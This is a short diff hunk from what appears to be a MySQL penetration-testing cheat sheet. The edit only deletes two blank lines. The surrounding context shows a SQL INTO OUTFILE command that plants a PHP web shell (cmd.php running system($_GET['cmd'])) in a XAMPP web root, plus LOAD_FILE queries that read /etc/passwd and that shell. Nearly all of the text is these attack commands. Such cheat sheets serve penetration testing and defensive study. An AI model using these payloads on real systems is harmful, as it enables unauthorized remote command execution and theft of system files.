@@ -35,14 +35,12 @@ Windows:
 ```bash
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\cmd.php";
 ```
-
 ### Read file on system
 
 ```bash
 SELECT LOAD_FILE("/etc/passwd");
 SELECT LOAD_FILE("C:\\xampp\\htdocs\\cmd.php");
 ```
-
 ### Mysqldump.exe
 
 ```bash
